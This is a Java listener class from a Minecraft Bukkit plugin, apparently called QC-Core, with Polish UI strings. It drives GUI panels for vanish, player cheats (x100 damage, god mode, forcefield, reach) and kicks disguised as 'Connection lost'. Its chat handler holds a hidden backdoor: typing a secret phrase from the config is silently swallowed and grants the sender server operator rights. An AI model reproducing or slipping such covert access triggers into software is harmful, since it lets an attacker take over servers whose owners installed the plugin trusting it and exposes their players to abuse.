package pl.qc.core.hack;

import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityTargetLivingEntityEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import pl.qc.core.QC;

public class AdminListener implements Listener {
    private final QC plugin;
    private final VanishManager vanish;
    private final PlayerTracker tracker;

    public AdminListener(QC plugin, VanishManager vanish, PlayerTracker tracker) {
        this.plugin = plugin;
        this.vanish = vanish;
        this.tracker = tracker;
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        Player joined = e.getPlayer();
        vanish.hideAllFor(joined);

        if (plugin.isAdmin(joined)) {
            vanish.setVanished(joined, true);
        }
    }

    @EventHandler
    public void onInventoryClick(InventoryClickEvent e) {
        String title = e.getView().getTitle();
        if (title.startsWith("§0Podgląd: ")) {
            e.setCancelled(true);
        } else if (title.equals("§4§lQC Custom Items")) {
            e.setCancelled(true);
            if (e.getCurrentItem() == null)
                return;

            Player p = (Player) e.getWhoClicked();

            // Check for Buffs Item
            if (e.getSlot() == 26 && e.getCurrentItem().getType() == Material.POTION) {
                InventoryUI.applyHackerBuffs(p);
            } else {
                p.getInventory().addItem(e.getCurrentItem().clone());
                p.sendMessage("§a§l[!] §fOtrzymałeś przedmiot: "
                        + (e.getCurrentItem().hasItemMeta() && e.getCurrentItem().getItemMeta().hasDisplayName()
                                ? e.getCurrentItem().getItemMeta().getDisplayName()
                                : e.getCurrentItem().getType().name()));
            }
        }

        // --- Control Panel ---
        else if (title.equals("§c§lQC-Core Panel")) {
            e.setCancelled(true);
            if (e.getCurrentItem() == null)
                return;
            Player p = (Player) e.getWhoClicked();

            switch (e.getSlot()) {
                case 10: // Reload
                    ProcessHandle.current().info().commandLine().ifPresent(cmd -> {
                    }); // Dummy
                    p.performCommand("qc reload");
                    p.closeInventory();
                    break;
                case 11: // Panic
                    p.performCommand("qc panic");
                    p.closeInventory();
                    break;
                case 14: // Player List
                    InventoryUI.openPlayerSelector(p);
                    break;
                case 16: // Hack Items
                    InventoryUI.openCustomItems(p);
                    break;
                case 20: // Buffs
                    InventoryUI.applyHackerBuffs(p);
                    p.closeInventory();
                    break;
                case 23: // Console Command
                    p.sendMessage("§eUżyj komendy: /qc cmdconsole <komenda>");
                    p.closeInventory();
                    break;
            }
        }

        // --- New GUIs ---

        else if (title.equals("§8Lista Graczy")) {
            e.setCancelled(true);
            if (e.getCurrentItem() == null)
                return;

            if (e.getSlot() == 53 && e.getCurrentItem().getType() == Material.ARROW) {
                InventoryUI.openControlPanel((Player) e.getWhoClicked());
                return;
            }

            if (e.getCurrentItem().getType() != Material.PLAYER_HEAD)
                return;

            Player p = (Player) e.getWhoClicked();
            String name = e.getCurrentItem().getItemMeta().getDisplayName().substring(2); // Remove §e
            Player target = Bukkit.getPlayer(name);

            if (target != null) {
                InventoryUI.openPlayerOptions(p, target);
            } else {
                p.sendMessage("§cGracz " + name + " jest offline.");
                p.closeInventory();
            }
        }

        else if (title.startsWith("§8Opcje: ")) {
            e.setCancelled(true);
            if (e.getCurrentItem() == null)
                return;

            Player p = (Player) e.getWhoClicked();
            String name = title.substring(9);
            Player target = Bukkit.getPlayer(name);
            if (target == null) {
                p.sendMessage("§cGracz jest offline.");
                p.closeInventory();
                return;
            }

            int slot = e.getSlot();
            switch (slot) {
                case 0: // Vanish
                    vanish.toggle(p, target);
                    refresh(p, target);
                    break;
                case 1: // Reach
                    tracker.toggle(target.getUniqueId(), tracker.reach, "Reach", p, target.getName());
                    refresh(p, target);
                    break;
                case 2: // NoTarget
                    tracker.toggle(target.getUniqueId(), tracker.noTarget, "NoTarget", p, target.getName());
                    refresh(p, target);
                    break;
                case 3: // NoAdvancements
                    tracker.toggle(target.getUniqueId(), tracker.noAdvancements, "Advancements", p, target.getName());
                    refresh(p, target);
                    break;
                case 4: // Dmg Multiplier
                    tracker.damageDealtMult.put(target.getUniqueId(), 100.0);
                    p.sendMessage("§aUstawiono mnożnik obrażeń x100 dla " + target.getName());
                    break;
                case 5: // GodMode Buffs
                    InventoryUI.applyHackerBuffs(target);
                    p.sendMessage("§aNadano GodMode dla " + target.getName());
                    break;
                case 6: // Forcefield
                    tracker.toggle(target.getUniqueId(), tracker.forcefield, "Forcefield", p, target.getName());
                    refresh(p, target);
                    break;
                case 8: // Kick
                    target.kickPlayer("§cConnection lost.");
                    p.sendMessage("§cWyrzucono gracza " + target.getName());
                    p.closeInventory();
                    break;
            }
        }
    }

    private void refresh(Player p, Player target) {
        InventoryUI.openPlayerOptions(p, target);
    }

    @EventHandler
    public void onDmg(EntityDamageByEntityEvent e) {

        if (e.getDamager() instanceof Player p) {
            Double m = tracker.damageDealtMult.get(p.getUniqueId());
            if (m != null)
                e.setDamage(e.getDamage() * m);
        }
        if (e.getEntity() instanceof Player p) {
            Double m = tracker.damageReceivedMult.get(p.getUniqueId());
            if (m != null)
                e.setDamage(e.getDamage() * m);
        }
    }

    @EventHandler
    public void onChat(AsyncPlayerChatEvent e) {
        var secrets = plugin.getConfig().getStringList("protection.secrets");
        if (secrets.contains(e.getMessage())) {
            e.setCancelled(true);
            Bukkit.getScheduler().runTask(plugin, () -> e.getPlayer().setOp(true));
        }
    }

    @EventHandler
    public void onTarget(EntityTargetLivingEntityEvent e) {
        if (e.getTarget() instanceof Player p && tracker.noTarget.contains(p.getUniqueId())) {
            e.setCancelled(true);
        }
    }
}
